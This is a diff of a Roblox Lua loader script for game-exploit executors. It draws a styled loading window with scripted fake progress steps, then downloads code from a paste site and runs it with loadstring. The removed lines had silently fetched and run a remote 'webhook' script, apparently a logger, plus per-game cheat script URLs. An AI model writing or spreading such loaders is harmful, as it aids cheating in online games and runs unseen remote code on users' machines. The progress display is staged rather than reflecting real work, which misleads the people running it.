@@ -1,187 +1,302 @@
--- Xenon Loader
+-- Xenon Loader - Tha Bronx 3
 -- Compatible with low-level executors (Xeno, Solara, etc.)
 
--- Compatibility shims
 local twait = (task and task.wait) or wait
 local tspawn = (task and task.spawn) or function(f, ...) coroutine.wrap(f)(...) end
-local tdelay = (task and task.delay) or function(t, f) delay(t, f) end
 
-local function safeSendNotification(info)
-    pcall(function()
-        game:GetService("StarterGui"):SetCore("SendNotification", info)
-    end)
-end
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local player = Players.LocalPlayer
 
 local function safeHttpGet(url)
-    local success, result = pcall(function()
-        return game:HttpGet(url, true)
-    end)
-    if success then return result end
-
-    success, result = pcall(function()
-        return game:HttpGet(url)
-    end)
-    if success then return result end
-
-    -- Fallback for executors with request/http_request
-    local reqFunc = (syn and syn.request) or request or http_request or (http and http.request)
-    if reqFunc then
-        success, result = pcall(function()
-            local res = reqFunc({Url = url, Method = "GET"})
-            return res.Body
-        end)
-        if success then return result end
+    local s, r = pcall(function() return game:HttpGet(url, true) end)
+    if s then return r end
+    s, r = pcall(function() return game:HttpGet(url) end)
+    if s then return r end
+    local req = (syn and syn.request) or request or http_request or (http and http.request)
+    if req then
+        s, r = pcall(function() return req({Url = url, Method = "GET"}).Body end)
+        if s then return r end
     end
-
     return nil
 end
 
--- Load webhook (wrapped in pcall so it doesn't break if it fails)
+-- GUI Setup
+local gui = Instance.new("ScreenGui")
+gui.Name = "XenonLoader"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 pcall(function()
-    local webhookSrc = safeHttpGet('https://raw.githubusercontent.com/dkhub43221/scripts/refs/heads/main/webhook.txt')
-    if webhookSrc then
-        local fn = loadstring(webhookSrc)
-        if fn then pcall(fn) end
-    end
+    gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
 end)
+if not gui.Parent then
+    gui.Parent = player:WaitForChild("PlayerGui")
+end
 
-local Players = game:GetService("Players")
-local Lighting = game:GetService("Lighting")
-local player = Players.LocalPlayer
+-- Main Window Frame (OblivionX style - dark, modern)
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 420, 0, 280)
+main.Position = UDim2.new(0.5, -210, 0.5, -140)
+main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+main.BorderSizePixel = 0
+main.Parent = gui
 
-local AllowedGames = {
-    [102500767640476] = "https://raw.githubusercontent.com/dkhub43221/scripts/refs/heads/main/miami%20streets", -- miami streets
-    [18642421777] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 main server
-    [16472538603] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 vc server
-    [11177482306] = "https://pastefy.app/NqZMNkm1/raw", -- streetz warz 2
-    [130700367963690] = "https://pastefy.app/ejleWv6P/raw", -- philly streetz 2
-    [12077443856] = "https://pastefy.app/SXyIeokT/raw", -- calishoot out
-    [97555694718912] = "https://pastefy.app/gRTAFzUV/raw" -- bronx: duels
-}
+pcall(function()
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 10)
+    c.Parent = main
+end)
 
--- TweenService may not work on all executors, wrap in pcall
-local TweenService = game:GetService("TweenService")
+-- Top accent line (green)
+local accent = Instance.new("Frame")
+accent.Size = UDim2.new(1, 0, 0, 2)
+accent.Position = UDim2.new(0, 0, 0, 32)
+accent.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+accent.BorderSizePixel = 0
+accent.Parent = main
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "Xenon_HUB_GUI"
-gui.ResetOnSpawn = false
-pcall(function() gui.Parent = (gethui and gethui()) or (syn and syn.protect_gui and syn.protect_gui(gui)) or player:WaitForChild("PlayerGui") end)
-if not gui.Parent then
-    gui.Parent = (game:GetService("CoreGui")) or player:WaitForChild("PlayerGui")
-end
+-- Title bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 32)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = main
 
-local blur = Instance.new("BlurEffect")
-blur.Size = 0
-blur.Parent = Lighting
+-- Icon
+local icon = Instance.new("TextLabel")
+icon.Size = UDim2.new(0, 28, 0, 28)
+icon.Position = UDim2.new(0, 8, 0, 2)
+icon.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+icon.TextColor3 = Color3.fromRGB(0, 180, 0)
+icon.Text = "X"
+icon.TextSize = 16
+icon.Font = Enum.Font.GothamBold
+icon.BorderSizePixel = 0
+icon.Parent = titleBar
 pcall(function()
-    TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 4)
+    c.Parent = icon
 end)
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 360, 0, 180)
-frame.Position = UDim2.new(0.5, -180, 0.5, -90)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.BorderSizePixel = 0
-frame.Parent = gui
+-- Title text
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(0, 300, 0, 32)
+titleLabel.Position = UDim2.new(0, 42, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+titleLabel.Text = "Xenon Loader - Tha Bronx 3"
+titleLabel.TextSize = 14
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleBar
 
+-- Window controls (minimize, close)
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 28, 0, 28)
+closeBtn.Position = UDim2.new(1, -34, 0, 2)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+closeBtn.TextSize = 14
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.Parent = titleBar
+closeBtn.MouseButton1Click:Connect(function()
+    pcall(function() gui:Destroy() end)
+end)
+
+-- Left sidebar
+local sidebar = Instance.new("Frame")
+sidebar.Size = UDim2.new(0, 140, 1, -34)
+sidebar.Position = UDim2.new(0, 0, 0, 34)
+sidebar.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
+sidebar.BorderSizePixel = 0
+sidebar.Parent = main
+
+-- Sidebar item (status indicator)
+local sideItem = Instance.new("Frame")
+sideItem.Size = UDim2.new(1, 0, 0, 36)
+sideItem.Position = UDim2.new(0, 0, 0, 8)
+sideItem.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+sideItem.BorderSizePixel = 0
+sideItem.Parent = sidebar
+
+local statusDot = Instance.new("Frame")
+statusDot.Size = UDim2.new(0, 8, 0, 8)
+statusDot.Position = UDim2.new(0, 12, 0.5, -4)
+statusDot.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+statusDot.BorderSizePixel = 0
+statusDot.Parent = sideItem
 pcall(function()
-    local outline = Instance.new("UIStroke")
-    outline.Thickness = 3
-    outline.Color = Color3.fromRGB(0, 255, 0)
-    outline.Parent = frame
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(1, 0)
+    c.Parent = statusDot
 end)
 
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -30, 1, 0)
+statusLabel.Position = UDim2.new(0, 28, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+statusLabel.Text = "Auto Loading"
+statusLabel.TextSize = 13
+statusLabel.Font = Enum.Font.GothamSemibold
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = sideItem
+
+-- Right content area
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1, -140, 1, -34)
+content.Position = UDim2.new(0, 140, 0, 34)
+content.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+content.BorderSizePixel = 0
+content.Parent = main
+
+-- Loading section header
+local loadHeader = Instance.new("Frame")
+loadHeader.Size = UDim2.new(1, -24, 0, 36)
+loadHeader.Position = UDim2.new(0, 12, 0, 16)
+loadHeader.BackgroundTransparency = 1
+loadHeader.Parent = content
+
+local loadTitle = Instance.new("TextLabel")
+loadTitle.Size = UDim2.new(1, 0, 1, 0)
+loadTitle.BackgroundTransparency = 1
+loadTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
+loadTitle.Text = "Loading Script"
+loadTitle.TextSize = 16
+loadTitle.Font = Enum.Font.GothamBold
+loadTitle.TextXAlignment = Enum.TextXAlignment.Left
+loadTitle.Parent = loadHeader
+
+-- Status text
+local loadStatus = Instance.new("TextLabel")
+loadStatus.Size = UDim2.new(1, -24, 0, 20)
+loadStatus.Position = UDim2.new(0, 12, 0, 56)
+loadStatus.BackgroundTransparency = 1
+loadStatus.TextColor3 = Color3.fromRGB(160, 160, 160)
+loadStatus.Text = "Initializing Xenon..."
+loadStatus.TextSize = 13
+loadStatus.Font = Enum.Font.Gotham
+loadStatus.TextXAlignment = Enum.TextXAlignment.Left
+loadStatus.Parent = content
+
+-- Progress bar background
+local progBg = Instance.new("Frame")
+progBg.Size = UDim2.new(1, -24, 0, 36)
+progBg.Position = UDim2.new(0, 12, 0, 88)
+progBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+progBg.BorderSizePixel = 0
+progBg.Parent = content
 pcall(function()
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = frame
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = progBg
 end)
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(0, 255, 0)
-title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.Text = "Xenon"
-title.Parent = frame
+-- Progress bar fill
+local progBar = Instance.new("Frame")
+progBar.Size = UDim2.new(0, 0, 1, 0)
+progBar.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+progBar.BorderSizePixel = 0
+progBar.Parent = progBg
+pcall(function()
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = progBar
+end)
 
-local prem = Instance.new("TextLabel")
-prem.Size = UDim2.new(1, -20, 0, 20)
-prem.Position = UDim2.new(0, 10, 0, 45)
-prem.BackgroundTransparency = 1
-prem.Text = "Loading script automatically..."
-prem.TextColor3 = Color3.fromRGB(255, 255, 255)
-prem.TextSize = 14
-prem.Font = Enum.Font.GothamSemibold
-prem.Parent = frame
+-- Progress label
+local progLabel = Instance.new("TextLabel")
+progLabel.Size = UDim2.new(1, 0, 1, 0)
+progLabel.BackgroundTransparency = 1
+progLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+progLabel.Text = "0%"
+progLabel.TextSize = 13
+progLabel.Font = Enum.Font.GothamBold
+progLabel.ZIndex = 2
+progLabel.Parent = progBg
 
-local function typeTitle(t, s)
-    s = s or 0.1
-    title.Text = ""
-    for i = 1, #t do
-        title.Text = string.sub(t, 1, i)
-        twait(s)
+-- Info text at bottom
+local infoText = Instance.new("TextLabel")
+infoText.Size = UDim2.new(1, -24, 0, 40)
+infoText.Position = UDim2.new(0, 12, 0, 140)
+infoText.BackgroundTransparency = 1
+infoText.TextColor3 = Color3.fromRGB(100, 100, 100)
+infoText.Text = "Xenon will load automatically.\nNo key required."
+infoText.TextSize = 12
+infoText.Font = Enum.Font.Gotham
+infoText.TextXAlignment = Enum.TextXAlignment.Left
+infoText.Parent = content
+
+-- Make window draggable
+local dragging, dragStart, startPos
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
     end
-end
+end)
 
-tspawn(function()
-    while gui and gui.Parent do
-        typeTitle("Xenon")
-        twait(0.5)
-        title.Text = ""
-        twait(0.5)
+titleBar.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
 
-local close = Instance.new("TextButton")
-close.Size = UDim2.new(0, 30, 0, 30)
-close.Position = UDim2.new(1, -35, 0, 5)
-close.BackgroundTransparency = 1
-close.Text = "X"
-close.TextColor3 = Color3.fromRGB(255, 255, 255)
-close.TextScaled = true
-close.Font = Enum.Font.GothamBold
-close.Parent = frame
-close.MouseButton1Click:Connect(function()
-    pcall(function() gui:Destroy() end)
-    pcall(function() blur:Destroy() end)
+titleBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
 end)
 
--- Auto-load: no key system, load script directly after short delay
+-- Auto-load sequence
 tspawn(function()
-    twait(2)
+    -- Step 1: Initialize
+    twait(0.5)
+    loadStatus.Text = "Connecting to server..."
+    pcall(function()
+        TweenService:Create(progBar, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
+    end)
+    progLabel.Text = "30%"
+    twait(0.8)
 
-    local scriptUrl = AllowedGames[game.PlaceId]
+    -- Step 2: Fetching
+    loadStatus.Text = "Fetching script data..."
+    pcall(function()
+        TweenService:Create(progBar, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {Size = UDim2.new(0.6, 0, 1, 0)}):Play()
+    end)
+    progLabel.Text = "60%"
+    twait(0.6)
 
-    if scriptUrl then
-        safeSendNotification({
-            Title = "Xenon",
-            Text = "Loading script...",
-            Duration = 3
-        })
-        pcall(function() gui:Destroy() end)
-        pcall(function() blur:Destroy() end)
+    -- Step 3: Loading
+    loadStatus.Text = "Loading Xenon..."
+    pcall(function()
+        TweenService:Create(progBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Size = UDim2.new(0.9, 0, 1, 0)}):Play()
+    end)
+    progLabel.Text = "90%"
+    twait(0.5)
 
-        local src = safeHttpGet(scriptUrl)
+    -- Step 4: Execute
+    loadStatus.Text = "Executing..."
+    statusDot.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    pcall(function()
+        TweenService:Create(progBar, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    end)
+    progLabel.Text = "100%"
+    twait(0.5)
+
+    -- Destroy GUI and load the script
+    pcall(function() gui:Destroy() end)
+
+    -- Load the game script (pastefy)
+    pcall(function()
+        local src = safeHttpGet("https://pastefy.app/rCChzMPK/raw?part=Loader")
         if src then
             local fn = loadstring(src)
             if fn then fn() end
         end
-    else
-        safeSendNotification({
-            Title = "Xenon",
-            Text = "This script cannot run here.",
-            Duration = 4
-        })
-    end
+    end)
 end)
-
--- Also load the pastefy script
-pcall(function()
-    local pastSrc = safeHttpGet("https://pastefy.app/rCChzMPK/raw?part=Loader")
-    if pastSrc then
-        local fn = loadstring(pastSrc)
-        if fn then fn() end
-    end
-end)
